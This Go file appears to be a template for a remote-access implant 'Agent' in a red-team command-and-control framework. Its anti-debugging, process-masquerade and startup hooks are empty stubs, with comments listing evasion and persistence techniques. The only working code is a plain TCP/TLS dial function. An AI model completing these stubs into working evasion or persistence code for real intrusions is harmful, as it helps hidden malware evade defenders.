package impl

import (
	"crypto/tls"
	"crypto/x509"
	"net"
	"time"

	"__NAME__/protocol"
	// __EVASION_IMPORT__
)

// Compile-time check: Agent must satisfy AgentImpl.
var _ AgentImpl = (*Agent)(nil)

// Agent is the concrete implementation of AgentImpl.
// Add any state your agent needs as struct fields.
type Agent struct {
	// Example: add fields for custom config, state, channels, etc.
	// __EVASION_FIELD__
}

// New creates a new Agent instance.
func New() *Agent {
	return &Agent{}
}

// ─── Stealth (cross-platform) ──────────────────────────────────────────────────
//
// These methods are called from main.go at startup.
// Override them to implement your anti-analysis and evasion techniques.

// IsDebugged returns true if a debugger or sandbox is detected.
// TODO: Implement your anti-debug detection logic.
// Examples:
//   - Linux:   read /proc/self/status for TracerPid
//   - Windows: call kernel32.IsDebuggerPresent
//   - macOS:   sysctl with KERN_PROC and check P_TRACED
func (a *Agent) IsDebugged() bool {
	return false
}

// Masquerade disguises the agent process.
// TODO: Implement your process masquerade technique.
// Examples:
//   - Linux:   unix.Prctl(PR_SET_NAME, ...) to rename process
//   - Windows: modify PEB process parameters
//   - macOS:   no reliable method (no-op)
func (a *Agent) Masquerade() {
	// no-op by default
}

// OnStart is called once before the connection loop begins.
// TODO: Add custom startup logic.
// Examples: environment fingerprinting, delayed execution, sandbox checks,
// anti-VM detection, persistence installation, config decryption, etc.
func (a *Agent) OnStart() {
	// no-op by default
}

// ─── Transport (cross-platform, working default) ──────────────────────────────
//
// The default implementation provides TCP + optional TLS transport.
// Override this entire method to implement HTTP, DNS, SMB, or any custom transport.

func (a *Agent) Dial(addr string, profile *protocol.Profile) (net.Conn, error) {
	timeout := time.Duration(profile.ConnTimeout) * time.Second
	if profile.UseSSL {
		tlsCfg := &tls.Config{InsecureSkipVerify: false}
		if len(profile.CaCert) > 0 {
			pool := x509.NewCertPool()
			pool.AppendCertsFromPEM(profile.CaCert)
			tlsCfg.RootCAs = pool
		}
		if len(profile.SslCert) > 0 && len(profile.SslKey) > 0 {
			cert, err := tls.X509KeyPair(profile.SslCert, profile.SslKey)
			if err != nil {
				return nil, err
			}
			tlsCfg.Certificates = []tls.Certificate{cert}
		}
		return tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", addr, tlsCfg)
	}
	return net.DialTimeout("tcp", addr, timeout)
}
